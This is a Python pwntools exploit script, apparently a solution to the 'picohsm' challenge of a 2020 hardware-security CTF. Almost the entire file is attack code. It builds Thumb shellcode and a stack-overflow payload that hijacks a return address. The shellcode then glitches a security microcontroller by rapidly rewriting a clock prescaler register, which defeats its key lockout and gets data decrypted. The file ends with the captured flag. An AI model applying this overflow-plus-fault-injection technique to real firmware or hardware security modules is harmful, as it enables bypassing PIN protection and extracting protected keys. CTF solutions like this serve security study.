#!/usr/bin/python
from pwn import *

context(arch='thumb', log_level='DEBUG')

pin = b'13372020'
msg = bytes.fromhex('196bc515f39ba541bef8e0fb5e74c2cb2d006ef5d11450fc860301a265c8e684')
result = bytes.fromhex('0000000000000000000000000000000000000000000000000000000000000000')

# Note: reuse clocking from MCU to feed the Security MCU.
# This removes a crystal and reduces costs.

# RM0033 Rev 8 page 95
RCC_CR      = 0x40023800
RCC_PLLCFGR = 0x40023804
RCC_CFGR    = 0x40023808
RCC_CIR     = 0x4002380C

# MCO1 PRE[2:0]
# MCO1PRE: MCO1 prescaler
# Set and cleared by software to configure the prescaler of the MCO1. Modification of this
# prescaler may generate glitches on MCO1. It is highly recommended to change this
# prescaler only after reset before enabling the external oscillators and the PLL.
# 0xx: no division
# 100: division by 2
# 101: division by 3
# 110: division by 4
# 111: division by 5 -> 0x7          000(0), 001(1), 010(2), 011(3), 100(4), 101(5), 110(6), 111(7)
MC01PRE_0 = 0
MC01PRE_2 = (1<<26)                     # 100
MC01PRE_3 = (1<<26)           | (1<<24) # 101
MC01PRE_4 = (1<<26) | (1<<25)           # 110
MC01PRE_5 = (1<<26) | (1<<25) | (1<<24) # 111
MC01PRE_MASK = (~MC01PRE_5) & 0xFFFFFFFF

# 00: HSI clock selected
# 01: LSE oscillator selected
# 10: HSE oscillator clock selected
# 11: PLL clock selected
MC01_HSI = 0
MC01_LSE =           (1<<21)
MC01_HSE = (1<<22)
MC01_PLL = (1<<22) | (1<<21)
MC01_MASK = (~MC01_PLL) & 0xFFFFFFFF

served = 0x08000724
stack = 0x20002000

hsm = 0x20000000
usart_flush = 0x080008ee # r0 = hsm
usart_tx = 0x080008fa # r0 = hsm, r1 = cmd
usart_tx_buf = 0x0800091c # r0 = hsm, r1 = buf, r2 = len
usart_rx = 0x08000936 # r0 = hsm
usart_rx_buf = 0x08000964 # r0 = hsm, r1 = buf, r2 = len
socket_print = 0x08001038 # r0 = socket, r1 = msg
socket_write = 0x08000ea4 # r0 = socket, r1 = msg, r2 = len
set_mco1_prescaler = 0x08000544
locked_addr = 0x0800135C
success_addr = 0x0800147c + 13
invalid_pin_addr = 0x0800133b
unexpected_error_addr = 0x08001349

CMD_VERIFY_PIN = 2
CMD_ENCRYPT = 2
CMD_DECRYPT = 3
STATUS_OK = 1

KEYID = 2

def mov32(reg, addr):
  return '\n'.join([
    'mov %s, 0x%x' % (reg, addr & 0xffff),
    'movt %s, 0x%x' % (reg, addr >> 16),
  ])
call_usart_flush = '\n'.join([
  'mov r0, r4', # hsm
  mov32('r3', usart_flush + 1),
  'blx r3',
])
call_usart_tx = '\n'.join([ # r1 = arg
  'mov r0, r4', # hsm
  mov32('r3', usart_tx + 1),
  'blx r3',
])
my_usart_tx = '\n'.join([ # r1 = arg
  'ldr r0, [r4]', # hsm
  'ustart_tx_retry:',
  'ldr r2, [r0]',
  'lsls r2, r2, 0x19',
  'bpl ustart_tx_retry',
  'str r1, [r0, 4]',
])
call_usart_tx_buf = '\n'.join([ # r1 = buf, r2 = len
  'mov r0, r4', # hsm
  mov32('r3', usart_tx_buf + 1),
  'blx r3',
])
call_usart_rx = '\n'.join([
  'mov r0, r4', # hsm
  mov32('r3', usart_rx + 1),
  'blx r3',
])
call_usart_rx_buf = '\n'.join([ # r1 = buf, r2 = len
  'mov r0, r4', # hsm
  mov32('r3', usart_rx_buf + 1),
  'blx r3',
])
call_socket_print = '\n'.join([ # r1 = buf
  'mov r0, sp', # socket
  mov32('r3', socket_print + 1),
  'blx r3',
])
call_socket_write = '\n'.join([ # r1 = buf, r2 = len
  'mov r0, sp', # socket
  mov32('r3', socket_write + 1),
  'blx r3',
])
call_set_mco1_prescaler = '\n'.join([
  mov32('r3', set_mco1_prescaler + 1),
  'blx r3',
])

cmd_help = b'help\n\x00'
buf_addr = stack - 0x330
pin_addr = buf_addr + len(cmd_help)
msg_addr = pin_addr + len(pin)
result_addr = msg_addr + len(msg)
shellcode_addr = result_addr + len(result)

code = [
  'nop',
  'nop',
  'nop',
  mov32('r4', hsm),
  mov32('r5', RCC_CFGR),
  'ldr r8, [r5]', # r8 old value (slow), r9 new value (fast)
  'and.w r8, r8, 0x%x' % MC01PRE_MASK,
  'orr.w r9, r8, 0x%x' % MC01PRE_2,
  'orr.w r8, r8, 0x%x' % MC01PRE_5,

  'mov r7, 0',
  'brute_force:',

  'mov r1, %i' % CMD_DECRYPT,
  call_usart_tx,
  mov32('r1', pin_addr),
  'mov r2, 8', # len
  call_usart_tx_buf,
  call_usart_rx, # receive status
  'cmp r0, 1',
  'bne pin_error',

  'mov r0, 0',

  'mov r1, %i' % KEYID,
  call_usart_tx,

  'mov r0, 0',
  'wait:'
  'add r0, 1',
  'cmp r0, 0x100',
  'bne wait',

  # glitch
  ] + [
  'str r9, [r5]',
  'str r8, [r5]',
  ]*6 + [

  call_usart_rx, # receive status
  'cmp r0, 1',
  'bne locked',

  'mov r1, %i' % 2, # number of blocks of length 16
  call_usart_tx,
  mov32('r1', msg_addr),
  'mov r2, 0x10', # len
  call_usart_tx_buf,
  mov32('r1', result_addr),
  'mov r2, 0x10', # len
  call_usart_rx_buf,
  mov32('r1', msg_addr + 16),
  'mov r2, 0x10', # len
  call_usart_tx_buf,
  mov32('r1', result_addr + 16),
  'mov r2, 0x10', # len
  call_usart_rx_buf,

  mov32('r1', result_addr),
  'ldrb r0, [r1]',

  mov32('r1', success_addr),
  call_socket_print,
  mov32('r1', result_addr),
  'mov r2, 0x10', # len
  call_socket_write,
  mov32('r1', result_addr + 16),
  'mov r2, 0x10', # len
  call_socket_write,
  'b end',

  'pin_error:',
  'cmp r0, 2',
  'bne unexpected_error',

  mov32('r1', invalid_pin_addr),
  call_socket_print,
  'b end',

  'unexpected_error:',
  mov32('r1', unexpected_error_addr),
  call_socket_print,
  'b end',

  'locked:',
  'add r7, 1',
  'cmp r7, 0x1000',
  'bne brute_force',
  mov32('r1', locked_addr),
  call_socket_print,

  'end:',
  mov32('r0', served + 1),
  'bx r0',
]

shellcode = asm('\n'.join(code))
print('shellcode len = %i / 0x%x' % (len(shellcode), len(shellcode)))
assert len(shellcode) % 2 == 0
cmd = cmd_help + pin + msg + result + shellcode
assert len(cmd) % 2 == 0
nop = asm('nop')
assert len(nop) == 2
prefix = cmd + nop * int((0x300 - len(cmd)) / 2)
assert len(prefix) == 0x300
payload = prefix + p32(0) + p32(shellcode_addr + 1)
assert len(payload) <= 0x400

p = remote('picohsm.donjon-ctf.io', 8009)
p.recvuntil('Timeout in 15 seconds...')
p.send(payload)
p.recvuntil('decrypt [PIN] [KEYID] [HEX] - decrypt a data blob.\n')
received = p.recvuntil('\n')
if received == b'Ledger Donjon CTF 2020\n':
  x = p.recv() + p.recv()
  print(hexdump(x))
  print(x)
elif received == b'Key is locked and cannot be used.\n':
  print('key locked')
elif received == b'Unexpected error.\n':
  print('unexpected error')
else:
  print(hexdump(received))
  print('failed')
p.close()

# CTF{t1s bUt a scr4tch}
